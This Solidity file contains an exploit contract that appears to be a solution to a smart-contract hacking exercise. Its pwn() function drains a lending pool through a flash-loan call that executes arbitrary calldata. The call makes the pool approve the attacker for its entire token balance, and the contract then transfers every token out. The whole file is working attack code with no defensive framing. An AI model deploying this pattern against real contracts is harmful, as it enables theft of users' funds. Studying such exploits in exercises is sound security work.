// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface ILendingPool {
    function token() external view returns (address);

    function flashLoan(
        uint amount,
        address target,
        bytes calldata data
    ) external;
}

interface ILendingPoolToken {
    // ILendingPoolToken is ERC20
    // declare any ERC20 functions that you need to call here
    function balanceOf(address) external view returns (uint);
    
    function approve(address, uint) external returns (uint);
    
    function transferFrom(
        address,
        address,
        uint
    ) external returns (bool);
}

contract LendingPoolExploit {
    ILendingPool public pool;
    ILendingPoolToken public token;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        token = ILendingPoolToken(pool.token());
    }

    function pwn() external {
        // this function will be called
        uint bal = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(token),
            abi.encodeWithSelector(token.approve.selector, address(this), bal)
        );
        token.transferFrom(address(pool), address(this), bal);
    }
}
